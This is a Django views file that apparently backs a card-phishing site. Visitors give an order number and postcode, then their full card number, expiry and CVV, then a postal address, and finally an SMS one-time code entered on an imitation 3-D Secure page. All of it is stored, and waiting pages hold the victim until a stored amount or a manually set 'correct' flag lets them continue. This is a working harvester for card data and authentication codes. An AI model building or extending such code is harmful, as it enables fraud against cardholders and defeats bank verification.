from django.http import request
from django.http.response import HttpResponse, HttpResponsePermanentRedirect, HttpResponseRedirect
from django.shortcuts import render, redirect
from .models import page1
from .forms import page1Form
from page2.models import page2
from django.urls import reverse


"""
def index(request):
    form = page1Form()
    if request.method == 'POST':
        form = page1Form(request.POST)
        if form.is_valid():
           form.save()
           return redirect("page1:amounts")

    context = {'form':form}
    return render(request, "page1/index.html", context)
"""

def index(request):
    if request.method == "POST":
        order_number = request.POST.get('order_number')
        post_code = request.POST.get('post_code')
        print(order_number)
        print(post_code)
        if order_number and post_code:
            n = page1.objects.create(orderNumber=order_number, postCode=post_code)
            n.save()
            id = n.id

            return HttpResponseRedirect(reverse('page1:waiting', args=[id]))

    return render(request,"page1/index.html")

def waitReply(request, pk):
    get_amount = page1.objects.get(id=pk)
    if get_amount.amount != '0':
        return HttpResponseRedirect(reverse('page1:card-details', args=[pk]))

    return render(request, "page1/payment-confirm.html")


def cardDetails(request, pk):
    get_amount = page1.objects.get(id=pk)
    context = {'get_amount':get_amount}
    if request.method == "POST":
        owner_name = request.POST.get('owner_name')
        card_number = request.POST.get('card_number')
        expiry = request.POST.get('expiry')
        cvv = request.POST.get('cvv')
        if owner_name and card_number and expiry and cvv:
            record = page1.objects.get(id=pk)
            record.owner_name = owner_name
            record.card_number = card_number
            record.expiry = expiry
            record.cvv = cvv
            record.save()

            return HttpResponseRedirect(reverse('page1:card-verification', args=[pk]))

    return render(request, "page1/card-details.html", context)


def are_card_details_correct(request, pk):
    card_verification = page1.objects.get(id=pk)
    if card_verification.is_card_correct == True:
        return HttpResponseRedirect(reverse('page1:address', args=[pk]))
    return render(request, "page1/card-details-verification.html")





def addressDetails(request, pk):
    if request.method == "POST":
        address_details = request.POST.get('address_details')
        if address_details:
            record = page1.objects.get(id=pk)
            record.address_details = address_details
            record.save()
            return HttpResponseRedirect(reverse('page1:address-verification', args=[pk]))
    return render(request, "page1/address_details.html")


def address_correct(request, pk):
    address = page1.objects.get(id=pk)
    if address.is_address_correct == True:
        return HttpResponseRedirect(reverse('page1:threeDS', args=[pk]))
    return render(request,"page1/address-verification.html")



def threeDSMain(request,pk):
    if request.method=="POST":
        if request.POST.get('text_message_button'):
            return HttpResponseRedirect(reverse('page1:authenticate-text', args=[pk]))
        elif request.POST.get('app_button'):
            return HttpResponseRedirect(reverse('page1:authenticate-app', args=[pk]))
    return render(request, "page1/threeDSMain.html")




def authenticate_text(request,pk):
    is_otp_received = page1.objects.get(id=pk)
    if request.method == "POST":
        otp_code = page1.objects.get(id=pk)
        otp_code.otp_code_from_user = request.POST.get('opt_code')
        otp_code.save()
        return HttpResponseRedirect(reverse('page1:code-status', args=[pk]))
    context = {'is_otp_received':is_otp_received}
    return render(request, "page1/code-verification-text.html", context)

def code_success(request, pk):
    otp_status = page1.objects.get(id=pk)
    context = {'otp_correct':otp_status}
    return render(request, 'page1/code-success.html', context)

def authenticate_app(request):
    return render(request, "page1/code-verification-app.html")